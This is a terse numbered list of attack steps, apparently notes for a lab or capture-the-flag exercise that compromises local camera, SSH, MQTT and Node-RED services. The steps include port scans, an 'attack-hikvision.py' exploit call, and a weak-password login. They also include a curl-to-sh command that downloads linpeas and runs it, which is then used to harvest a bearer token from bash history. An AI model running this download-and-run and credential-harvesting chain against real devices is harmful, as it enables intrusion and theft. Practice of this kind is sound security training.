1. `nmap -p- 127.0.0.1` -> 8888 (camera)
2. `curl localhost:8888` -> version
3. `py attack-hikvision.py localhost:8888 screenshot; icat screenshot.png`
4. `py attack-hikvision.py localhost:8888 config`
5. `ssh operator@localhost -p 22222` password123
6. `nix-shell -p nmap` `nmap -p- localhost` -> 1880 1883
7. `nmap -p 1883 -sV localhost`
8. .attack.py / `su` `systemctl stop mosquitto..`
9. `curl -L https://github.com/peass-ng/PeASS-ng/releases/latest/download/linpeas.sh | sh` -> BEARER bash_history
10. `curl http://localhost:1880/next -H "Authorization: Bearer $BEARER"`
11. robot *overflow* lock *'secret' password*
